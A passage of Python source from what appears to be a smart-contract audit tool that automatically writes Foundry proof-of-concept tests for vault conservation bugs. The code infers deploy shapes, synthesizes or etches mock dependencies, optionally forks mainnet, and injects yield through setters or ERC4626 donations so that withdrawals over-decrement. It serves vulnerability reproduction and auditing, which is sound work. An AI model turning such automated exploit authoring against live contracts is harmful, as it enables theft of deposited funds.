    from the interface. Without interface source, require callers to provide
    full signature strings so we do not turn an unknown return-bearing function
    into a void stub.
    """
    if not methods_called:
        return None
    out: List[str] = []
    if iface_src and _parse_protocol_dep_interface is not None:
        by_name: Dict[str, List[str]] = {}
        for member in _parse_protocol_dep_interface(iface_src):
            by_name.setdefault(member.name, []).append(member.signature())
        for method in methods_called:
            if "(" in method:
                out.append(method)
            else:
                out.extend(by_name.get(method, [f"{method}()"]))
        return out
    if any("(" not in method for method in methods_called):
        return None
    return methods_called


def _protocol_dep_evidence_map(candidate: Dict[str, Any],
                               deploy_shape: Dict[str, Any],
                               field: str,
                               arg_type: str,
                               arg_name: str) -> Optional[Dict[str, Any]]:
    """Look up per-dependency mock evidence from candidate or deploy metadata.

    Accepted shapes:
      {"protocol_dep_mock_return_values": {"foo()": ["1"]}}
      {"protocol_dep_mock_return_values": {"config_": {"foo()": ["1"]}}}
      {"protocol_dep_mock_return_values": {"IConfig": {"foo()": ["1"]}}}
    """
    for container in (candidate, deploy_shape):
        raw = container.get(field) if isinstance(container, dict) else None
        if not isinstance(raw, dict):
            continue
        for key in (arg_name, arg_name.rstrip("_"), arg_type):
            nested = raw.get(key)
            if isinstance(nested, dict):
                return nested
        if any(k == "*" or "(" in str(k) for k in raw.keys()):
            return raw
        if not all(isinstance(v, dict) for v in raw.values()):
            return raw
    return None


def _default_protocol_dep_negative_control(arg_type: str,
                                           arg_name: str) -> Dict[str, str]:
    return {
        "*": (
            f"test-provided negative control leaves {arg_name}:{arg_type} on "
            "the clean path and asserts the conservation impact does not "
            "reproduce"
        )
    }


def _record_app_dep_obligations(deploy_shape: Dict[str, Any],
                                synth: Dict[str, Any]) -> None:
    obligations = [
        str(o) for o in synth.get("obligations", [])
        if str(o).strip()
    ]
    if not obligations:
        return
    deploy_shape.setdefault("app_dep_mock_obligations", []).extend(obligations)
    deploy_shape["app_dep_mock_ready"] = False
    deploy_shape["app_dep_mock_implemented_members"] = list(
        synth.get("implemented_members", []))


def _synthesize_app_dep_mock(
        arg_type: str, methods_called: List[str], iface_src: Optional[str],
        dest_dir: Path, pragma: str, idx: int, *,
        return_values: Optional[Dict[str, Any]] = None,
        negative_control_behavior: Optional[Dict[str, str]] = None
        ) -> Dict[str, Any]:
    """Synthesize a deployable mock for an APPLICATION-LEVEL protocol dependency
    via the committed structured `protocol_dep_mock_synth` report API. Passes the
    in-tree interface source when resolvable else the called-member signatures
    the target actually invokes. Writes the mock only when the report is ready.
    A non-ready result preserves the report obligations for caller diagnostics."""
    name = f"_SynthProtoDep{idx}"
    if _analyze_protocol_dep_mock_synthesis is None:
        return _app_dep_non_ready(
            name,
            ["mock-synthesis-api-unavailable: protocol dep synth lib is absent"],
        )
    called = _called_member_requests(iface_src, methods_called)
    if iface_src is None and methods_called and called is None:
        return _app_dep_non_ready(
            name,
            [("missing-called-member-signatures: application dependency methods "
              "were observed by name only; provide interface source or full "
              "called-member signatures with parameter and return types")],
        )
    if iface_src:
        # full declared interface surface; restrict to the called members so the
        # mock implements EXACTLY what the target invokes (minimal surface).
        report = _analyze_protocol_dep_mock_synthesis(
            iface_src, called, idx=idx, pragma=pragma, contract_name=name,
            return_values=return_values,
            negative_control_behavior=negative_control_behavior)
    else:
        # no in-tree iface source -> synthesize from the called-member sigs
        # parsed from the target's real usage.
        if not called:
            return _app_dep_non_ready(
                name,
                ["missing-required-methods: no app-dependency calls parsed"],
            )
        report = _analyze_protocol_dep_mock_synthesis(
            called, idx=idx, pragma=pragma, contract_name=name,
            return_values=return_values,
            negative_control_behavior=negative_control_behavior)
    if not getattr(report, "ok", False):
        return _app_dep_non_ready(
            name,
            [o.format() for o in getattr(report, "obligations", [])],
            list(getattr(report, "implemented_members", [])),
        )
    dest_dir.mkdir(parents=True, exist_ok=True)
    path = dest_dir / f"{name}.sol"
    path.write_text(report.source)
    return {
        "ready": True,
        "path": path.as_posix(),
        "name": name,
        "obligations": [],
        "implemented_members": list(report.implemented_members),
    }


# Boolean-gate setter name suffixes that indicate a deposit/withdraw enable
# toggle the harness must flip to `true` before in/out flows are permitted.
# These are GENERIC gate-name flavors, not target literals.
_ENABLE_TRUE_SUFFIX_RE = re.compile(
    r"(?:Enabled|Open|Active|Allowed|Live|On)$", re.I)
# Setters whose `true` value would BLOCK flow (a pause-style flag); flip false.
_PAUSE_SUFFIX_RE = re.compile(r"(?:Paused|Frozen|Disabled|Halted|Closed)$", re.I)


def _enable_toggles(src: str) -> List[str]:
    """Infer the boolean owner-setters the vault needs flipped before deposits /
    withdrawals are permitted. Recognizes GENERICALLY:
      - `set<X>(bool)` whose name ends in an enable-flavored suffix
        (Enabled / Open / Active / Allowed / Live / On) -> set true,
      - `set<X>(bool)` whose name ends in a pause-flavored suffix
        (Paused / Frozen / Disabled / Halted / Closed) -> set false,
      - no-arg `enable<X>()` -> call it.
    Only deposit/withdraw/inflow/outflow-related gates are flipped (the name must
    mention a flow term) so we do not toggle unrelated boolean config setters."""
    calls: List[str] = []
    _FLOW_RE = re.compile(
        r"deposit|withdraw|inflow|outflow|redeem|mint|flow", re.I)
    for m in re.finditer(r"function\s+(set(\w+))\s*\(\s*bool", src):
        fn, suffix_root = m.group(1), m.group(2)
        if not _FLOW_RE.search(fn):
            continue
        if _ENABLE_TRUE_SUFFIX_RE.search(suffix_root):
            calls.append(f"{fn}(true)")
        elif _PAUSE_SUFFIX_RE.search(suffix_root):
            calls.append(f"{fn}(false)")
    for m in re.finditer(r"function\s+(enable\w+)\s*\(\s*\)", src):
        if _FLOW_RE.search(m.group(1)):
            calls.append(f"{m.group(1)}()")
    seen = set()
    out = []
    for c in calls:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out


def _infer_caller_gate_registration(src: str) -> Optional[Dict[str, str]]:
    """Some conservation bugs gate the inflation term on the CALLER identity:
    `previewYield(caller, ...)` only inflates when `caller == address(<var>)`
    where `<var>` is a privileged state var (e.g. a yield-recipient vault). For
    the bug to fire, the withdraw must come FROM that registered address. This
    infers, FROM SOURCE: (a) the gated state-var name from the `caller ==
    address(<var>)` comparison inside the inflation fn, and (b) the owner setter
    that writes `<var>` (`<var> = ...` inside an external/owner function). Returns
    {"gate_var": <var>, "setter": <fnName>} or None if there is no caller gate
    (the common case - most conservation bugs have no caller gate)."""
    g = re.search(r"caller\s*==\s*address\(\s*(\w+)\s*\)", src)
    if not g:
        return None
    gate_var = g.group(1)
    # find the external/public function that assigns `<gate_var> = ...`.
    setter = None
    for m in re.finditer(r"function\s+(\w+)\s*\(\s*address\s+\w+\s*\)\s*external", src):
        fnname = m.group(1)
        body = src[m.end():m.end() + 400]
        if re.search(rf"\b{re.escape(gate_var)}\s*=", body):
            setter = fnname
            break
    if setter is None:
        return None
    return {"gate_var": gate_var, "setter": setter}


def _phase_entry_fn(src: str) -> Optional[str]:
    """Infer the phase-entry function that drives the vault into the inflating
    mode the conservation bug needs (the `*YieldPhase` / `start*` / `enter*`
    no-arg owner function). Returns the fn name or None. The bug's inflation
    site is gated on a phase enum; this is the lever that enters that phase."""
    for pat in (r"function\s+(\w*[Yy]ield[Pp]hase)\s*\(\s*\)",
                r"function\s+(\w*[Rr]eward[Ee]poch)\s*\(\s*\)",
                r"function\s+(\w*[Ee]poch)\s*\(\s*\)",
                r"function\s+(start\w+)\s*\(\s*\)",
                r"function\s+(activate\w+)\s*\(\s*\)",
                r"function\s+(enter\w+)\s*\(\s*\)",
                r"function\s+(begin\w+)\s*\(\s*\)"):
        m = re.search(pat, src)
        if m:
            return m.group(1)
    return None


def _erc4626_entrypoints(src: str) -> Dict[str, Optional[str]]:
    """Infer the public deposit/withdraw entrypoints. A vault that inherits
    ERC4626 / ERC4626Upgradeable ALWAYS exposes the standard public
    `deposit(uint256,address)` / `withdraw(uint256,address,address)` entrypoints,
    even when it only overrides the internal `_deposit`/`_withdraw` hooks (the
    common case). So we treat the entrypoints as present when EITHER an explicit
    public `function deposit(`/`function withdraw(` is declared OR the source
    inherits an ERC4626 base (detected from `is ... ERC4626 ...` or the internal
    `_deposit`/`_withdraw` override that only an ERC4626 descendant declares)."""
    out: Dict[str, Optional[str]] = {"deposit": None, "withdraw": None}
    erc4626_base = bool(re.search(r"\bERC4626(Upgradeable)?\b", src))
    if re.search(r"function\s+deposit\s*\(", src) or (
            erc4626_base and re.search(r"function\s+_deposit\s*\(", src)):
        out["deposit"] = "deposit"
    if re.search(r"function\s+withdraw\s*\(", src) or (
            erc4626_base and re.search(r"function\s+_withdraw\s*\(", src)):
        out["withdraw"] = "withdraw"
    return out


# --- iter17: GENERAL dep-routing for three deploy patterns the iter16 typed-arg
# detector missed. None of these key on a target name; they recognize deploy
# SHAPES from source:
#   (a) CONSTRUCTOR-injected deps  -> deploy via `new Vault(...)` (no initialize).
#   (b) ADDRESS-TYPED deps         -> `address X` cast in-body to IERC20(X) /
#       IERC4626(X) / IOracle(X); pass the synthesized mock's *address*.
#   (c) HARDCODED-CONSTANT deps    -> `address constant DEP = 0x..;` or an
#       immutable set to a literal; vm.etch the synthesized mock at that address.
# All three reuse `_synthesize_dep_mock` for the actual mock body and infer the
# needed mock kind from the cast / usage sites, never a hardcoded mock template.

# A cast `IFoo(<var>)` / `IFoo(address(<var>))` of an address arg to a token
# interface tells us what mock kind the arg needs. The interface-name -> mock-kind
# map is GENERIC: any interface whose name resolves to the ERC20 / ERC4626 family
# (or is so used) routes to the matching synthesized mock.
_ADDR_CAST_ERC20_IFACES = {
    "IERC20", "IERC20Metadata", "IERC20Upgradeable", "IERC20Permit", "IWETH",
    "IWETH9", "IToken", "IStablecoin", "IUnderlying", "IAsset",
}
_ADDR_CAST_ERC4626_IFACES = {
    "IERC4626", "IERC4626Upgradeable", "IVault", "IStakedVault", "IStaking",
    "IYieldVault",
}


def _addr_cast_dep_type(src: str, argname: str) -> Optional[str]:
    """For an `address <argname>` parameter, infer whether the body casts it to a
    synthesizable token interface (`IERC20(arg)` / `IERC4626(arg)` / `IOracle(arg)`
    or via a state var the arg is stored into). Returns the canonical synthesizable
    arg-type ('IERC20' or 'IERC4626') the address should be backed by, or None when
    the address is not cast to a token/vault interface we can synthesize. The cast
    may be on the arg itself, its de-underscored form, or a state var assigned the
    arg. The interface family is inferred from the cast name (ERC20-family ->
    IERC20, ERC4626/vault-family -> IERC4626). The ERC4626 family is preferred when
    both appear so a vault dep is not under-modelled as a plain token."""
    bare = argname.rstrip("_")
    vars_to_scan = {argname, bare}
    for am in re.finditer(rf"\b(\w+)\s*=\s*{re.escape(argname)}\s*;", src):
        vars_to_scan.add(am.group(1))
    for am in re.finditer(rf"\b(\w+)\s*=\s*{re.escape(bare)}\s*;", src):
        vars_to_scan.add(am.group(1))
    # also follow `<state> = IFoo(<arg>);` assignment casts so the state var's
    # later usage is attributed, and the cast interface is captured directly.
    saw_erc20 = False
    saw_erc4626 = False
    for v in vars_to_scan:
        if not v:
            continue
        # cast forms: IFoo(v)  /  IFoo(address(v))
        for m in re.finditer(
                rf"\b([A-Z]\w*)\s*\(\s*(?:address\s*\(\s*)?{re.escape(v)}\b", src):
            iface = m.group(1)
            if iface in _ADDR_CAST_ERC4626_IFACES:
                saw_erc4626 = True
            elif iface in _ADDR_CAST_ERC20_IFACES:
                saw_erc20 = True
    if saw_erc4626:
        return "IERC4626"
    if saw_erc20:
        return "IERC20"
    return None


# A hardcoded-constant dependency: `<Type> constant NAME = 0x<addr>;` or an
# immutable set to a literal address. We only route ones whose declared type OR
# in-body usage marks them as an ERC20 / ERC4626 token dependency.
# The RHS literal may be bare (`= 0x..`), or wrapped in a cast of any flavor
# (`= address(0x..)`, `= IERC20(0x..)`, `= IFoo(address(0x..))`), so we allow an
# optional `<Ident>(` and/or `address(` prefix before the 20-byte hex literal.
_CONST_ADDR_DECL_RE = re.compile(
    r"\b([A-Za-z_]\w*)\s+(?:public\s+|private\s+|internal\s+)?"
    r"constant\s+(\w+)\s*=\s*(?:[A-Za-z_]\w*\s*\(\s*)?(?:address\s*\(\s*)?"
    r"(0x[0-9a-fA-F]{40})",
)
_IMMUTABLE_ADDR_DECL_RE = re.compile(
    r"\b([A-Za-z_]\w*)\s+(?:public\s+|private\s+|internal\s+)?immutable\s+(\w+)\b",
)


def _hardcoded_constant_deps(src: str) -> List[Dict[str, Any]]:
    """Find hardcoded-constant token dependencies the vault reads from a fixed
    address: `<Type> constant NAME = 0x<addr>;` or `<Type> immutable NAME` set to
    a literal address in the constructor. Returns a list of
    {"name", "addr", "dep_type" ('IERC20'|'IERC4626'), "methods_called"} for each
    routable constant. A constant is routable only when its declared type OR its
    in-body cast/usage marks it as a token/vault dep we can synthesize. vm.etch
    backs the address with a synthesized mock so the REAL vault reads it.
    GENERIC: no constant NAME or address literal is hardcoded in the tool."""
    out: List[Dict[str, Any]] = []
    seen: set = set()

    def _route(decl_type: str, name: str, addr: str) -> None:
        if name in seen:
            return
        dep_type = None
        if decl_type in _ERC4626_ARG_TYPES or decl_type in _ADDR_CAST_ERC4626_IFACES:
            dep_type = "IERC4626"
        elif decl_type in _ERC20_ARG_TYPES or decl_type in _ADDR_CAST_ERC20_IFACES:
            dep_type = "IERC20"
        else:
            # address-typed constant: infer from in-body cast/usage of the name.
            cast = _addr_cast_dep_type(src, name)
            if cast:
                dep_type = cast
        if dep_type is None:
            return
        seen.add(name)
        out.append({
            "name": name, "addr": addr, "dep_type": dep_type,
            "methods_called": _dep_methods_called(src, name),
            "is_erc20": dep_type == "IERC20"})

    for m in _CONST_ADDR_DECL_RE.finditer(src):
        _route(m.group(1), m.group(2), m.group(3))
    # immutable set to a literal address inside the constructor body.
    for m in _IMMUTABLE_ADDR_DECL_RE.finditer(src):
        decl_type, name = m.group(1), m.group(2)
        am = re.search(rf"\b{re.escape(name)}\s*=\s*(?:[A-Za-z_]\w*\s*\(\s*)?"
                       r"(?:address\s*\(\s*)?(0x[0-9a-fA-F]{40})", src)
        if am:
            _route(decl_type, name, am.group(1))
    return out


def detect_inplace_vault_deploy_shape(src: str, project: Path,
                                      unit_name: Optional[str] = None
                                      ) -> Optional[Dict[str, Any]]:
    """GENERIC (iter15-A + iter17): recognize a deployable vault whose in-place
    real-deploy PoC can be auto-authored, by INFERRING from source the deploy
    recipe. Routes FOUR deploy-shape PATTERNS (no target name is matched):

      iter16 (typed initializer args):
        - an `initialize(...)` upgradeable initializer (own OR inherited) whose
          token deps are TYPED `IERC20`/`IERC4626` args; deploy via ERC1967Proxy.

      iter17 (GENERAL dep routing - the patterns the iter16 typed-arg detector
      missed; each is a deploy SHAPE, never a target name):
        (a) CONSTRUCTOR-injected deps: a non-upgradeable vault with NO initializer
            whose CONSTRUCTOR takes the token deps; deploy via `new Vault(...)`.
        (b) ADDRESS-TYPED deps: an `address X` initializer/constructor arg the
            body casts to `IERC20(X)`/`IERC4626(X)`; pass the synthesized mock's
            *address* (`address(mock)`), not the instance.
        (c) HARDCODED-CONSTANT deps: `address constant DEP = 0x..;` or an
            immutable set to a literal; vm.etch a synthesized mock at that address.

    Inference unions the cited contract's source with its in-project ancestors so
    inherited initializers / constructors / entrypoints / toggles are seen.
    Returns the inferred deploy recipe or None when any required piece cannot be
    inferred (caller falls back to the self-contained reproduction).
    The base-ERC20 requirement is satisfied by ANY of the four routes.
    """
    # Union ancestor source so inherited members are visible to inference.
    rsrc = src
    if unit_name:
        rsrc = resolve_inheritance_source(src, unit_name, project)
    # below, all inference reads the inheritance-resolved source.
    src = rsrc

    # Deploy mode: prefer an upgradeable `initialize(...)` (ERC1967Proxy deploy);
    # fall back to a CONSTRUCTOR (iter17 pattern (a): non-upgradeable `new` deploy).
    deploy_mode = "initialize"
    sig = _initializer_signature(src)
    if sig is not None and sig["params"]:
        params = sig["params"]
    else:
        ctor_raw = _constructor_params(src, unit_name) if unit_name else None
        if not ctor_raw:
            return None
        params = _split_params(ctor_raw)
        if not params:
            return None
        deploy_mode = "constructor"

    arg_mocks: List[Dict[str, Any]] = []
    have_base_erc20 = False
    for (atype, aname) in params:
        # Typed token dep (iter16) OR address-typed dep cast to a token iface
        # (iter17 pattern (b)). For an `address` arg, infer the dep kind from the
        # cast/usage sites; `pass_as` records how the arg is passed to deploy.
        is_typed_token = atype in _ERC20_ARG_TYPES or atype in _ERC4626_ARG_TYPES
        addr_cast = None
        if atype == "address":
            addr_cast = _addr_cast_dep_type(src, aname)
        if not (is_typed_token or addr_cast):
            continue
        eff_type = atype if is_typed_token else addr_cast
        pass_as = "instance" if is_typed_token else "address"
        is_erc20 = eff_type in _ERC20_ARG_TYPES
        mock = _resolve_mock_for_type(project, eff_type, exclude_unit=unit_name)
        if mock is None:
            # No project source mock -> SYNTHESIZE from the interface the target
            # actually invokes on it (iter16 honesty anchor).
            arg_mocks.append({
                "type": eff_type, "name": aname,
                "mock": None, "synthesize": True, "pass_as": pass_as,
                "methods_called": _dep_methods_called(src, aname),
                "is_erc20": is_erc20})
        else:
            arg_mocks.append({"type": eff_type, "name": aname,
                              "mock": mock.as_posix(), "synthesize": False,
                              "pass_as": pass_as, "is_erc20": is_erc20})
        if is_erc20:
            have_base_erc20 = True

    # iter17 pattern (c): hardcoded-constant token deps read from a fixed address.
    # These are NOT in the param list - the vault reads them from a constant /
    # immutable. They are backed via vm.etch at author time. A constant-only base
    # ERC20 also satisfies the base-ERC20 requirement.
    etch_deps = _hardcoded_constant_deps(src)
    if any(d["is_erc20"] for d in etch_deps):
        have_base_erc20 = True

    if not have_base_erc20:
        return None
    phase_fn = _phase_entry_fn(src)
    if phase_fn is None:
        return None
    eps = _erc4626_entrypoints(src)
    if not (eps["deposit"] and eps["withdraw"]):
        return None
    return {
        "deploy_mode": deploy_mode,
        # back-compat key name (iter16 callers read `initializer_params`); it now
        # carries the initializer OR constructor params depending on deploy_mode.
        "initializer_params": params,
        "arg_mocks": arg_mocks,
        "etch_deps": etch_deps,
        "enable_toggles": _enable_toggles(src),
        "phase_entry_fn": phase_fn,
        "deposit_fn": eps["deposit"],
        "withdraw_fn": eps["withdraw"],
        # caller-gate registration (None when the bug has no caller gate).
        "caller_gate": _infer_caller_gate_registration(src),
        # back-compat keys: presence of a base ERC20 / staking ERC4626 dep
        # (resolved OR synthesized, as a param arg OR a hardcoded constant). A
        # synthesized arg has mock=None but its presence still means the dep is
        # available, so back-compat callers that only test truthiness see a
        # sentinel string for synthesized / etch'd args.
        "mock_usde": next(
            (m["mock"] or "<synthesized>" for m in arg_mocks if m["is_erc20"]),
            "<synthesized>" if any(d["is_erc20"] for d in etch_deps) else None),
        "mock_susde": next(
            (m["mock"] or "<synthesized>" for m in arg_mocks if not m["is_erc20"]),
            "<synthesized>" if any(not d["is_erc20"] for d in etch_deps) else None),
    }


def _infer_yield_injection(src: str, deploy_shape: Dict[str, Any],
                           base_var: Optional[str] = None,
                           stake_var: Optional[str] = None
                           ) -> Optional[Dict[str, str]]:
    """Infer how to make the inflation term (`previewYield`/`*yield*`/`*reward*`)
    return non-zero, FROM SOURCE. Two generic levers, in priority order:

      (1) an owner test-hook setter on the vault itself
          (`set<Yield>(uint)` / `inject<Yield>(uint)` / `accrue<Yield>(uint)`),
          which is the cleanest lever and target-agnostic, OR
      (2) a raw-transfer donation into the ERC4626 staking vault arg (lifting
          its `previewRedeem`), which works whenever the inflation term reads an
          external ERC4626's `previewRedeem`/`previewWithdraw`.

    `base_var` / `stake_var`: the actual solidity variable names the author bound
    the base ERC20 / stake ERC4626 mock to in the generated test. iter17: with
    address-typed or vm.etch'd deps the test var name no longer equals the param
    name (e.g. `_etch_base_at`), so the author passes the resolved names; when
    omitted (iter16 callers) we fall back to the param-name derivation.

    Returns {"inject_stmt": <solidity>, "kind": <lever>} or None when neither
    lever can be inferred (caller falls back to the self-contained repro)."""
    # Lever 1: an on-vault yield setter/injector test hook.
    m = re.search(r"function\s+((?:set|inject|accrue|add)\w*[Yy]ield\w*)\s*\(\s*uint\d*",
                  src)
    if m:
        return {"kind": "vault-setter",
                "inject_stmt": f"vault.{m.group(1)}(INJECTED_YIELD);"}
    m = re.search(r"function\s+((?:set|inject|accrue|add)\w*[Rr]eward\w*)\s*\(\s*uint\d*",
                  src)
    if m:
        return {"kind": "vault-setter",
                "inject_stmt": f"vault.{m.group(1)}(INJECTED_YIELD);"}
    # Lever 2: donation into the external ERC4626 staking vault (lifts its
    # previewRedeem). Only when (a) the inflation term reads an ERC4626 preview
    # AND (b) the deploy shape resolved an ERC4626 dep (arg OR etch'd constant).
    susde = deploy_shape.get("mock_susde")
    # The base/stake mock var names: prefer the author-resolved names; else derive
    # from the param arg names (iter16 back-compat path).
    if base_var is None:
        erc20_arg = next((m for m in deploy_shape.get("arg_mocks", [])
                          if m.get("is_erc20")), None)
        base_var = erc20_arg["name"].rstrip("_") if erc20_arg else None
    if stake_var is None:
        erc4626_arg = next((m for m in deploy_shape.get("arg_mocks", [])
                            if not m.get("is_erc20")), None)
        stake_var = erc4626_arg["name"].rstrip("_") if erc4626_arg else None
    if susde and stake_var and base_var and re.search(
            r"previewRedeem|previewWithdraw|sUSDe\.|stakedAsset|vault\s*\.\s*preview", src):
        base = base_var
        stake = stake_var
        # SEED the ERC4626 with a real deposit BEFORE donating, so its share
        # supply is non-zero and `previewRedeem(1e18)` is BOUNDED. Donating into
        # an EMPTY ERC4626 makes previewRedeem explode (virtual-shares: shares *
        # (assets+1) / (0+1)) and the inflation term overflows the accumulator,
        # which reverts instead of producing a measurable over-decrement. Seeding
        # SEED_SHARES base assets, then donating an EQUAL amount, lifts the
        # 1e18-share preview by ~1 base unit - a small, measurable over-charge.
        return {"kind": "erc4626-donation",
                "inject_stmt":
                    f"{base}.mint(address(this), 2 * SEED_SHARES);\n"
                    f"        {base}.approve(address({stake}), SEED_SHARES);\n"
                    f"        {stake}.deposit(SEED_SHARES, address(this));\n"
                    f"        {base}.transfer(address({stake}), SEED_SHARES);"}
    return None


def _resolve_fork_config(deploy_shape: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """obl9-prep CAPABILITY 2 (fork-mode): resolve an OPT-IN fork configuration.
    A target that reads LIVE-MAINNET hardcoded addresses (a Liquity StabilityPool,
    a Chainlink price feed) cannot be faked by a synth/etch mock - those deps must
    resolve to REAL forked-mainnet code. Fork-mode is OPT-IN: it activates ONLY
    when a fork RPC is configured via a per-run `deploy_shape['fork_rpc']` field OR
    the `AUDITOOOR_EVM0DAY_FORK_RPC` env var. With no fork config this returns None
    and the authored harness keeps its current synth/etch behavior unchanged.

    Returns {"rpc": <url-or-alias>, "block": <int|None>} or None."""
    rpc = (deploy_shape or {}).get("fork_rpc") or os.environ.get(
        "AUDITOOOR_EVM0DAY_FORK_RPC")
    if not rpc:
        return None
    rpc = str(rpc).strip()
    if not rpc:
        return None
    block = (deploy_shape or {}).get("fork_block")
    if block is None:
        env_blk = os.environ.get("AUDITOOOR_EVM0DAY_FORK_BLOCK")
        block = env_blk if env_blk else None
    if block is not None:
        try:
            block = int(str(block).strip())
        except (TypeError, ValueError):
            block = None
    return {"rpc": rpc, "block": block}


def _fork_select_stmt(fork_cfg: Dict[str, Any]) -> str:
    """Emit the `vm.createSelectFork(...)` statement for the resolved fork config.
    A bare RPC alias / URL string is passed verbatim; an optional block pins the
    fork height for reproducibility."""
    rpc = fork_cfg["rpc"]
    # If the RPC looks like a foundry endpoint ALIAS (a bare identifier, e.g.
    # `mainnet`), pass it as a string literal too - createSelectFork accepts the
    # alias-or-URL string form. We always emit a double-quoted string literal.
    lit = rpc.replace('"', '\\"')
    if fork_cfg.get("block") is not None:
        return f'        vm.createSelectFork("{lit}", {int(fork_cfg["block"])});'
    return f'        vm.createSelectFork("{lit}");'


def _ctor_arg_for_mock(arg: Dict[str, Any]) -> str:
    """Pick how the mock for a given initializer arg is constructed in setUp.
    ERC20 base mocks are no-arg (`new MockX()`); ERC4626 staking mocks commonly
    take `(IERC20 asset, address rewarder, address owner)` (the Ethena-family
    StakedUSDe ctor). We detect that ctor arity from the mock source and emit a
    matching `new` call. The arg's solidity var name is `arg["var"]`."""
    return arg["new_expr"]


def author_vault_conservation_inplace(candidate: Dict[str, Any], src: str,
                                      unit_name: str, fn: Dict[str, Any],
                                      shape: Dict[str, str],
                                      test_dir: Path, project: Path,
                                      deploy_shape: Dict[str, Any]
                                      ) -> Optional[Dict[str, str]]:
    """GENERIC (iter15-A) IN-PLACE real-deploy PoC author for the vault-
    conservation bug class. NOTHING is keyed on a target literal: the deploy
    recipe is built from `deploy_shape` (inferred initializer arg types + their
    source mocks, enable-toggles, phase-entry fn, deposit/withdraw entrypoints)
    and the yield-injection lever is inferred from source. The test deploys the
    REAL `unit_name` via ERC1967Proxy with ONLY external-dependency mocks, drives
    it into the inflating phase, injects yield through the inferred lever, and
    asserts the REAL withdraw entrypoint over-decrements the cited accumulator by
    more than the base principal. The negative control proves the non-inflating
    (points) phase conserves exactly. Returns None when a required piece cannot
    be inferred so the caller honestly falls back to the self-contained repro."""
    acc = shape["accumulator"]
    # GAP B / GAP-B+1: derive the authored test pragma (and the synthesized dep
    # mock pragma) from the PROJECT-PIN-AWARE resolved solc, not the raw source
    # pragma - so a foundry.toml solc pin is honored by BOTH the test and the mocks.
    test_pragma = _derive_test_pragma(src, project)
    gen_dir = test_dir / "_evm0day_autoproof"

    # obl9-prep CAPABILITY 2: OPT-IN fork-mode. When a fork RPC is configured the
    # target executes against REAL forked-mainnet state, so its hardcoded
    # live-mainnet deps resolve to real code and MUST NOT be synth/etch'd. With no
    # fork config this is None and the synth/etch path below is unchanged.
    fork_cfg = _resolve_fork_config(deploy_shape)

    deposit_fn = deploy_shape.get("deposit_fn", "deposit")
    withdraw_fn = deploy_shape.get("withdraw_fn", "withdraw")
    phase_fn = deploy_shape.get("phase_entry_fn")
    if not phase_fn:
        return None
    # Yield-lever inference reads the inheritance-resolved source.
    rsrc = resolve_inheritance_source(src, unit_name, project)

    # Resolve vault import + mock imports (from the inferred arg list).
    src_file = project / candidate["rel_path"]
    rel_vault = _rel_import_from(gen_dir, src_file) if src_file.exists() else None
    if rel_vault is None:
        for p in project.rglob(Path(candidate["rel_path"]).name):
            rel_vault = _rel_import_from(gen_dir, p)
            break
    if rel_vault is None:
        return None

    # Build the per-arg deploy info: mock contract name, import, ctor call, and
    # the initializer-call argument expression. Owner/address args are filled
    # with `owner`; token args with the constructed mock instance.
    import_lines: List[str] = []
    setup_mock_lines: List[str] = []
    field_decls: List[str] = []
    init_args: List[str] = []           # expressions passed to initialize(...)
    seen_imports = set()
    base_token_var: Optional[str] = None
    stake_vault_var: Optional[str] = None

    # Track synthesized-mock files so the caller writes them into the gen dir
    # before compiling and removes them after the run.
    synth_mocks: List[Dict[str, str]] = []
    arg_mocks = deploy_shape.get("arg_mocks", [])

    # iter17 (c): hardcoded-constant token deps the vault reads from a fixed
    # address. Synthesize a mock per constant and vm.etch its runtime code at the
    # constant address so the REAL vault reads the synthesized mock. PROCESSED
    # FIRST so the base ERC20 (when it is a constant) is bound before the param
    # loop builds the ERC4626 stake mock (whose ctor needs the base token var).
    etch_lines: List[str] = []
    etch_constant_addr: List[str] = []  # (addr-literal) we mint into for funding
    for dep in deploy_shape.get("etch_deps", []):
        # GAP-B+1: the synthesized dep mock must float over the PROJECT-PIN-AWARE
        # resolved solc (`test_pragma`), NOT the raw source pragma - else a project
        # pinning solc='0.8.21' gets a mock pinned `^0.8.35` (the svm highest) and
        # forge fails `No solc version exists that matches ^0.8.35`.
        synth = _synthesize_dep_mock(
            dep["dep_type"], dep.get("methods_called", []), gen_dir, test_pragma)
        if synth is None:
            return None
        mock_name = synth["name"]
        mock_path = Path(synth["path"])
        synth_mocks.append({"path": synth["path"], "name": mock_name})
        rel = f"./{mock_path.name}"
        if mock_name not in seen_imports:
            import_lines.append(f'import {{{mock_name}}} from "{rel}";')
            seen_imports.add(mock_name)
        dep_var = f"_etch_{dep['name']}"
        new_expr = _mock_new_expr(mock_path, mock_name, base_token_var)
        if new_expr is None:
            return None
        # Build the mock locally (in setUp), etch its runtime code at the constant
        # address, then bind a typed CONTRACT-FIELD handle at that address so the
        # test fns (not just setUp) can mint/seed through it. The handle is a field
        # (declared below) assigned in setUp; the temp builder var is setUp-local.
        addr = dep["addr"]
        handle = f"{dep_var}_at"
        field_decls.append(f"    {mock_name} {handle};")
        etch_lines.append(f"        {mock_name} {dep_var} = {new_expr};")
        etch_lines.append(f"        vm.etch({addr}, address({dep_var}).code);")
        etch_lines.append(f"        {handle} = {mock_name}({addr});")
        if dep["is_erc20"] and base_token_var is None:
            base_token_var = handle
            etch_constant_addr.append(addr)
        elif not dep["is_erc20"] and stake_vault_var is None:
            stake_vault_var = handle

    for (atype, aname) in deploy_shape["initializer_params"]:
        var = aname.rstrip("_")
        # A token dep is any param the detector routed into arg_mocks - that
        # includes TYPED IERC20/IERC4626 args (iter16) AND address-typed args the
        # body casts to a token iface (iter17 pattern (b)). `pass_as` records
        # whether the deploy arg is the mock INSTANCE or its ADDRESS.
        arg = next((m for m in arg_mocks if m["name"] == aname), None)
        if arg is not None:
            if arg.get("synthesize"):
                # iter16: synthesize a minimal compliant dep mock from the
                # interface the target invokes. The file is co-located with the
                # generated test (gen_dir), so the import is a bare local path.
                synth = _synthesize_dep_mock(
                    arg["type"], arg.get("methods_called", []), gen_dir, test_pragma)
                if synth is None:
                    return None
                mock_name = synth["name"]
                mock_path = Path(synth["path"])
                synth_mocks.append({"path": synth["path"], "name": mock_name})
                rel = f"./{mock_path.name}"
            else:
                mock_path = Path(arg["mock"])
                mock_name = _contract_name_in_file(mock_path)
                if not mock_name:
                    return None
                rel = _rel_import_from(gen_dir, mock_path)
            if mock_name not in seen_imports:
                import_lines.append(f'import {{{mock_name}}} from "{rel}";')
                seen_imports.add(mock_name)
